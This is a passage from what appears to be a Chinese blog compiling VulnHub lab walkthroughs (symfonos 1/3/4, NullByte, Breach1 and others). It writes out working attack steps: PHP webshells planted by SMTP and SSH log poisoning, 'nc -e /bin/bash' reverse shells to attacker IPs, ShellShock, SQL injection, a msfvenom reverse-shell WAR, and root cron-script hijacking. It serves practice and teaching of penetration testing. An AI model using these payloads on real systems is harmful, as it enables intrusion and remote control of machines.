src="/images/vulnhub_walkthrough_set/DerpNStink/img/20.png" alt="" /></p><p>开启http服务，下载至本地</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/21.png" alt="" /></p><p>使用wireshark分析流量</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/22.png" alt="" /><br /><code>mrderp:derpderpderpderpderpderpderp</code></p><p>切换至用户mrderp</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/23.png" alt="" /></p><p>查看文件<br /><code>cat /home/mrderp/Desktop/helpdesk.log</code></p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/24.png" alt="" /></p><p>访问链接</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/25.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/26.png" alt="" /></p><p>可以进行sudo提权</p><p>上传python反弹Shell脚本</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/27.png" alt="" /></p><p>提权为root</p><p><img src="/images/vulnhub_walkthrough_set/DerpNStink/img/28.png" alt="" /></p><hr /><blockquote><p>密码共用</p></blockquote><p><s>太常规了</s></p><hr /><h1 id="symfonos-1"><a class="markdownIt-Anchor" href="#symfonos-1"></a> <a href="https://www.vulnhub.com/entry/symfonos-1,322/">symfonos 1</a></h1><p><code>2020/06/27 00:25:29</code></p><h2 id="寻找靶机ip-10"><a class="markdownIt-Anchor" href="#寻找靶机ip-10"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/00.png" alt="" /></p><h2 id="端口扫描-26"><a class="markdownIt-Anchor" href="#端口扫描-26"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/01.png" alt="" /></p><h2 id="web路径扫描-10"><a class="markdownIt-Anchor" href="#web路径扫描-10"></a> Web路径扫描</h2><p><code>dirb http://192.168.88.130/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/02.png" alt="" /></p><h2 id="漏洞利用-26"><a class="markdownIt-Anchor" href="#漏洞利用-26"></a> 漏洞利用</h2><p>收集smb信息<br /><code>enum4linux 192.168.88.130</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/03.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/04.png" alt="" /></p><p>目录/anonymous可以匿名访问<br />使用空账户即可登入</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/05.png" alt="" /></p><p>下载并查看<code>attention.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/06.png" alt="" /></p><p>文本中提到三个弱口令，可以使用这三个弱口令来尝试登入helios账户的个人目录<br /><code>smbclint //192.168.88.130/helios -U helios</code><br />使用口令 <code>qwerty</code> 即可登入</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/07.png" alt="" /></p><p>查看文本<code>todo.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/08.png" alt="" /><br />得到信息<code>/h3l105</code></p><p>Web主页如图</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/09.png" alt="" /></p><p>而且扫描Web目录时并未获取到有效信息<br />猜测<code>/h3l105</code>为Web目录</p><p>访问目录<code>/h3l105</code>，为Wordpress站点</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/10.png" alt="" /></p><p>使用wpscan进行扫描</p><p><code>wpscan --url http://192.168.88.130/h3l105/ -e ap --plugins-detection Aggressive</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/11.png" alt="" /></p><p>查询相关漏洞</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/12.png" alt="" /></p><p>使用Telnet连接SMTP服务来写入Webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.88.130 25</span><br><span class="line">MAIL FROM: &lt;Hacker&gt;</span><br><span class="line">RCPT TO: helios</span><br><span class="line">data</span><br><span class="line">&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/13.png" alt="" /></p><p>使用LFI来实现GetShell</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/14.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/15.png" alt="" /></p><p><code>http://192.168.88.130/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;pass=nc -e /bin/bash 192.168.88.129 8081</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/16.png" alt="" /></p><h2 id="权限提升-26"><a class="markdownIt-Anchor" href="#权限提升-26"></a> 权限提升</h2><p>查看具有SUID的程序</p><p><code>find / -user root -perm -4000 -print 2&gt; /dev/null</code><br /><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/17.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/18.png" alt="" /></p><p>可以进行PATH提权</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/19.png" alt="" /></p><hr /><blockquote><p>SMTP+LFI=GetShell</p></blockquote><ul><li>通过SMTP写入WebShel的内容（需要已知一个系统的用户名）</li><li>再利用LFI来执行WebShell（Web包含可以访问/var/mail）</li></ul><p>参考资料</p><blockquote><p><a href="https://medium.com/@markonsecurity/symfonos-1-walkthrough-vulnhub-df08dbcb0d36">WalkThrough</a></p></blockquote><hr /><h1 id="symfonos-3"><a class="markdownIt-Anchor" href="#symfonos-3"></a> <a href="https://www.vulnhub.com/entry/symfonos-31,332/">symfonos 3</a></h1><p><code>2020/07/05 15:27:23</code></p><h2 id="寻找靶机ip-11"><a class="markdownIt-Anchor" href="#寻找靶机ip-11"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/00.png" alt="" /></p><h2 id="端口扫描-27"><a class="markdownIt-Anchor" href="#端口扫描-27"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/01.png" alt="" /></p><h2 id="web路径扫描-11"><a class="markdownIt-Anchor" href="#web路径扫描-11"></a> Web路径扫描</h2><p><code>dirb http://192.168.88.130/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/02.png" alt="" /></p><h2 id="漏洞利用-27"><a class="markdownIt-Anchor" href="#漏洞利用-27"></a> 漏洞利用</h2><p>访问页面，在源代码出得到信息</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/03.png" alt="" /></p><p>尝试后发现存在路径<code>/cgi-bin/underworld</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/04.png" alt="" /></p><p>使用ShellShock漏洞反弹Shell<br /><code>curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.88.130/cgi-bin/underworld</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/05.png" alt="" /></p><h2 id="权限提升-27"><a class="markdownIt-Anchor" href="#权限提升-27"></a> 权限提升</h2><p>获取pty</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/06.png" alt="" /></p><p>查找属于用户组hades的文件</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/07.png" alt="" /></p><p>查看statuscheck.txt</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/08.png" alt="" /><br />应该是curl请求的结果</p><p>下载pspy</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/09.png" alt="" /></p><p>运行pspy之后得到信息</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/10.png" alt="" /><br />python2脚本<code>ftpclient.py</code>为计划任务</p><p>靶机上存在tcpdump</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/11.png" alt="" /></p><p>使用tcpdump监听流量<br /><code>timeout 120 tcpdump -v -i lo port 21</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/12.png" alt="" /></p><p>得到账户<code>hades:PTpZTfU4vxgzvRBE</code></p><p>使用ssh登入靶机后查看脚本文件</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/13.png" alt="" /><br />文件不可写，且目录无法操作</p><p>查看库文件<code>ftplib</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/14.png" alt="" /><br />库文件可写</p><p>修改库文件中的ftp.quit()函数</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/15.png" alt="" /><br />插入反弹Shell命令</p><p>提权成功</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/16.png" alt="" /></p><hr /><blockquote><p>ShellShock</p></blockquote><ul><li>apache</li><li>/cgi-bin/* (200)</li></ul><p>参考资料</p><blockquote><p><a href="https://infosecjohn.blog/posts/vulnhub-symfonos-3/">WalkThrough</a></p></blockquote><hr /><h1 id="symfonos-4"><a class="markdownIt-Anchor" href="#symfonos-4"></a> <a href="https://www.vulnhub.com/entry/symfonos-4,347/">symfonos 4</a></h1><p><code>2020/07/20 11:00:24</code></p><h2 id="寻找靶机ip-12"><a class="markdownIt-Anchor" href="#寻找靶机ip-12"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/00.png" alt="" /></p><h2 id="端口扫描-28"><a class="markdownIt-Anchor" href="#端口扫描-28"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.145</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/01.png" alt="" /></p><h2 id="web路径扫描-12"><a class="markdownIt-Anchor" href="#web路径扫描-12"></a> Web路径扫描</h2><p><code>gobuster dir -u 192.168.31.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/02.png" alt="" /></p><h2 id="漏洞利用-28"><a class="markdownIt-Anchor" href="#漏洞利用-28"></a> 漏洞利用</h2><p>访问<code>/atlantis.php</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/03.png" alt="" /></p><p>使用SQL注入Bypass登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&#39; or 1#</span><br><span class="line">password&#x3D;1</span><br></pre></td></tr></table></figure><p>登入后跳转至<code>/sea.php</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/04.png" alt="" /></p><p>选择Hades之后出现文字内容</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/05.png" alt="" /><br />也出现了Get参数<code>file</code></p><p>访问<code>/gods</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/06.png" alt="" /><br />可能存在本地文件包含漏洞，且文件名后面会补上<code>.log</code></p><p>尝试包含登入日志<br /><code>/sea.php?file=../../../../var/log/auth</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/07.png" alt="" /><br />存在本地文件包含漏洞</p><p>ssh登入构造Webshell<br /><code>ssh '&lt;?php system($_GET['pass']); ?&gt;'@192.168.31.145</code></p><p>反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9901</span><br><span class="line">&#x2F;sea.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.31.10 9901</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/08.png" alt="" /></p><h2 id="权限提升-28"><a class="markdownIt-Anchor" href="#权限提升-28"></a> 权限提升</h2><p>获取tty<br /><code>python -c 'import pty;pty.spawm(&quot;/bin/bash&quot;)'</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/09.png" alt="" /></p><p>查看本地服务<br /><code>ss -antlp</code><br /><code>ps -auxwww | grep 127.0.01</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/10.png" alt="" /></p><p>端口转发<br /><code>socat tcp-listen:1234,fork tcp-connect:localhost:8080</code></p><p>访问<code>http://192.168.31.145:1234/</code></p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/11.png" alt="" /></p><p>查看cookie</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/12.png" alt="" /></p><p>Base64解码</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/13.png" alt="" /></p><p>可能存在pickle反序列化漏洞，构造反弹Shell的Payload</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/14.png" alt="" /></p><p>发送Payload</p><p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/15.png" alt="" /><br />提权成功</p><hr /><blockquote><p>jsonpickle反序列化</p></blockquote><p>在进行反序列化的时候会执行<code>函数reduce</code>类似于php反序列化中的wakeup()</p><p>参考资料</p><blockquote><p><a href="https://www.hackingarticles.in/symfonos4-vulnhub-walkthrough/">WalkThrough</a><br /><a href="https://pentesterjourney.com/tag/symfonos4/">WalkThrough</a><br /><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">pickel</a></p></blockquote><hr /><h1 id="nullbyte"><a class="markdownIt-Anchor" href="#nullbyte"></a> <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">NullByte</a></h1><p><code>2020/07/31 10:52:00</code></p><h2 id="寻找靶机ip-13"><a class="markdownIt-Anchor" href="#寻找靶机ip-13"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/00.png" alt="" /></p><h2 id="端口扫描-29"><a class="markdownIt-Anchor" href="#端口扫描-29"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.234</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/01.png" alt="" /></p><h2 id="web路径扫描-13"><a class="markdownIt-Anchor" href="#web路径扫描-13"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.234/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/02.png" alt="" /></p><h2 id="漏洞利用-29"><a class="markdownIt-Anchor" href="#漏洞利用-29"></a> 漏洞利用</h2><p>访问Web页面</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/03.png" alt="" /></p><p>下载图片并分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.31.234&#x2F;main.gif</span><br><span class="line">exiftool main.gif</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/04.png" alt="" /></p><p>访问目录<code>/kzMb5nVYJw</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/05.png" alt="" /></p><p>查看源代码</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/06.png" alt="" /></p><p>使用Burpsuite对POST参数<strong>key</strong>进行爆破<br />字典文件为<code>/usr/share/wordlists/dirb/big.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/07.png" alt="" /></p><p>输入key之后页面变化</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/08.png" alt="" /></p><p>提交<code>usrtosearch</code>参数进行查询</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/09.png" alt="" /></p><p>直接访问<code>420search.php</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/10.png" alt="" /></p><p>猜测该php文件可以对数据库进行查询，可能存在SQL注入</p><p>提交参数<code>usrtosearch=admin&quot; or 1=1%23</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/11.png" alt="" /></p><p>确认存在SQL注入</p><p>使用SQLMap</p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin --dbs --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/12.png" alt="" /></p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth --tables --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/13.png" alt="" /></p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users --columns --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/14.png" alt="" /></p><p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users -C id,position,user,pass --dump --batch</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/15.png" alt="" /></p><p>Base64解码</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/16.png" alt="" /></p><p>Hash破解</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/17.png" alt="" /></p><p>使用该账户登入SSH</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/18.png" alt="" /></p><h2 id="权限提升-29"><a class="markdownIt-Anchor" href="#权限提升-29"></a> 权限提升</h2><p>查看文件<code>~/.bash_history</code></p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/19.png" alt="" /><br />存在文件<code>/var/www/backup/procwatch</code></p><p>文件执行<code>ps</code>命令，且具有SUID权限</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/20.png" alt="" /></p><p>进行PATH提权</p><p><img src="/images/vulnhub_walkthrough_set/NullByte/img/21.png" alt="" /></p><hr /><p>参考资料</p><blockquote><p><a href="https://medium.com/@pharish4948/vulnhub-null-byte-walkthrough-bde63c1dd38d">WalkThrough</a></p></blockquote><hr /><h1 id="breach1"><a class="markdownIt-Anchor" href="#breach1"></a> <a href="https://www.vulnhub.com/entry/breach-1,152/">Breach1</a></h1><p><code>2020/09/06 11:35:19</code></p><h2 id="寻找靶机ip-14"><a class="markdownIt-Anchor" href="#寻找靶机ip-14"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.110.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/00.png" alt="" /></p><h2 id="端口扫描-30"><a class="markdownIt-Anchor" href="#端口扫描-30"></a> 端口扫描</h2><p><code>nmap --top-port 200 -sV -T5 -v -n 192.168.110.140</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/01.png" alt="" /></p><p>目标靶机存在IDS/IPS</p><h2 id="web路径扫描-14"><a class="markdownIt-Anchor" href="#web路径扫描-14"></a> Web路径扫描</h2><p><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.110.140/</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/02.png" alt="" /></p><h2 id="漏洞利用-30"><a class="markdownIt-Anchor" href="#漏洞利用-30"></a> 漏洞利用</h2><p>使用浏览器访问Web页面</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/03.png" alt="" /></p><p>查看源代码</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/04.png" alt="" /></p><p>两次Base64解码后得到<br /><code>pgibbons:damnitfeel$goodtobeagang$ta</code></p><p>图片导向其他页面</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/05.png" alt="" /></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/06.png" alt="" /></p><p>点击<code>Employee portal</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/07.png" alt="" /></p><p>使用账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: pgibbons</span><br><span class="line">password: damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/08.png" alt="" /></p><p>在第三封邮件中获得有效信息</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/09.png" alt="" /></p><p>keystore文件<br /><code>192.168.110.140/.keystore</code></p><p>查看Contributions</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/10.png" alt="" /></p><p>可以进一步获得信息</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/11.png" alt="" /></p><p>这里可以再获取一个流量包文件<br /><code>http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</code><br />并且得知密码为<code>tomcat</code></p><p>查看keystore所存储的私钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -keystore keystore</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/12.png" alt="" /></p><p>导出p12证书</p><p><code>keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype pkcs12</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/13.png" alt="" /></p><p>使用Wireshark分析流量包</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/14.png" alt="" /></p><p>目标靶机的8443端口可能存在加密Web服务</p><p>导入证书文件<br /><code>Edit -&gt; Preferences -&gt; Protocols -&gt; TLS -&gt; Edit...</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/15.png" alt="" /></p><p>导入之后即可解密TLS流量</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/16.png" alt="" /></p><p>对于Basic认证内容进行Base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC&#39; | base64 -d</span><br><span class="line">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure><p>访问<code>https://192.168.110.140:8443/_M@nag3Me/html</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/17.png" alt="" /></p><p>认证错误，使用Burpsuite代理</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/18.png" alt="" /></p><p>使用账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: tomcat</span><br><span class="line">password: Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure><p>构造恶意war包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;9902 -f raw &gt; msf.jsp</span><br><span class="line">zip msf.zip msf.jsp</span><br><span class="line">mv msf.zip msf.war</span><br></pre></td></tr></table></figure><p>上传war包</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/19.png" alt="" /></p><p>在MSFConsole中进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload java&#x2F;jsp_shell_reverse_tcp</span><br><span class="line">set LHOST 192.168.110.3</span><br><span class="line">set LPORT 9902</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>访问URL<code>https://192.168.110.140:8443/msf/msf.jsp</code></p><p>MSFConsole中接收到Shell</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/20.png" alt="" /></p><h2 id="权限提升-30"><a class="markdownIt-Anchor" href="#权限提升-30"></a> 权限提升</h2><p>mysql空口令登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root</span><br><span class="line">select user,password from mysql.user;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/21.png" alt="" /></p><p>破解MD5值</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/22.png" alt="" /></p><p><code>thelaststraw</code></p><p>切换账户至milton</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su milton</span><br><span class="line">thelaststraw</span><br></pre></td></tr></table></figure><p>下载图片，查看EXIF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.110.140&#x2F;images&#x2F;bill.png</span><br><span class="line">exiftool bill.png</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/23.png" alt="" /></p><p>得到密码<br /><code>coffeestains</code></p><p>切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su blumbergh</span><br><span class="line">coffeestains</span><br></pre></td></tr></table></figure><p>开启本地HTTP服务<br /><code>python -m SimpleHTTPServer 9900&amp;</code><br /><img src="/images/vulnhub_walkthrough_set/Breach1/img/24.png" alt="" /></p><p>靶机下载pspy<br /><code>wget http://192.168.110.3:9900/pspy64</code><br /><img src="/images/vulnhub_walkthrough_set/Breach1/img/25.png" alt="" /></p><p>使用pspy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x pspy64</span><br><span class="line">.&#x2F;pspy64 | grep UID&#x3D;0 &amp;</span><br></pre></td></tr></table></figure><p>可以看到root执行的命令<code>/bin/sh -c /usr/share/cleanup/tidyup.sh</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/26.png" alt="" /></p><p>查看sudo权限，<a href="http://xn--teeshelltidy-c86sfa42ubzn74jkraw8few0g3i5f72sc.sh">可以使用tee写反弹shell命令至tidy.sh</a><br />root执行反弹shell命令之后即可获得root权限</p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/27.png" alt="" /></p><p><code>echo 'nc -e /bin/bash 192.168.110.3 9903' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</code></p><p><code>nc -lvnp 9903</code></p><p><img src="/images/vulnhub_walkthrough_set/Breach1/img/28.png" alt="" /></p><hr /><blockquote><p>keystore</p></blockquote><p>可以使用keytool查看并导出keystore中所存储的密钥文件</p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/zhuxr/p/9848230.html">WalkThrough</a></p></blockquote><hr /><h1 id="infosec_warrior02"><a class="markdownIt-Anchor" href="#infosec_warrior02"></a> <a href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-02,447/">Infosec_Warrior02</a></h1><p><code>2020/09/09 12:46:57</code></p><h2 id="寻找靶机ip-15"><a class="markdownIt-Anchor" href="#寻找靶机ip-15"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/00.png" alt="" /></p><h2 id="端口扫描-31"><a class="markdownIt-Anchor" href="#端口扫描-31"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.109</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/01.png" alt="" /></p><h2 id="漏洞利用-31"><a class="markdownIt-Anchor" href="#漏洞利用-31"></a> 漏洞利用</h2><p>使用nc连接目标56563端口</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/02.png" alt="" /></p><p>尝试输入非预期输入</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/03.png" alt="" /></p><p>得到报错信息</p><p>可以利用input()函数进行RCE<br />payload: <code>__import__(&quot;os&quot;).system(&quot;/bin/bash&quot;)</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/04.png" alt="" /></p><p>获取Shell</p><h2 id="权限提升-31"><a class="markdownIt-Anchor" href="#权限提升-31"></a> 权限提升</h2><p>SSH登入时得到信息</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/05.png" alt="" /></p><p>查看发型版的代号<br /><code>cat /etc/*release</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/06.png" alt="" /></p><p>查看主机名与用户名</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/07.png" alt="" /></p><p>构造账户</p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/08.png" alt="" /></p><p><code>hydra -I -L user -P pass -e n ssh://192.168.1.109</code></p><p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/09.png" alt="" /></p><p>得到账户 <code>ck04:bionic</code></p><p>SSH登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh ck04@192.168.1.109 -p 